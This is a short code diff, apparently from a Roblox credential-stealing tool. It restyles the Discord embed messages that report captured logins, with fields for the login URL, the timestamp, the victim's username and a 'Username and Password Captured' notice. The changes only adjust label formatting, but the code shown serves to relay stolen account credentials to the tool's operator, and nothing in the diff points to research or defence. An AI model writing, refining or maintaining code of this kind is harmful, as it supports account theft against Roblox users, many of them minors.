@@ -479,7 +479,7 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
         inline: false
       },
       {
-        name: "<:emoji_37:1410520517349212200> Username",
+        name: "<:emoji_37:1410520517349212200> **Username**",
         value: userData.username || "Unknown",
         inline: false
       },
@@ -617,17 +617,17 @@ function formatRobloxLoginEmbed(logData) {
       color: 0xFFFFFF,
       fields: [
         {
-          name: '<:emoji_37:1410520517349212200> **LOGIN URL**',
+          name: '<:emoji_37:1410520517349212200> **Login Url**',
           value: logData.url || 'Unknown',
           inline: true
         },
         {
-          name: '<:emoji_37:1410520517349212200> Timestamp',
+          name: '<:emoji_37:1410520517349212200> **Timestamp**',
           value: new Date(logData.timestamp).toLocaleString(),
           inline: true
         },
         {
-          name: '<:emoji_37:1410520517349212200> **SUCCESS**',
+          name: '<:emoji_37:1410520517349212200> **Success**',
           value: 'Username and Password Captured',
           inline: false
         }
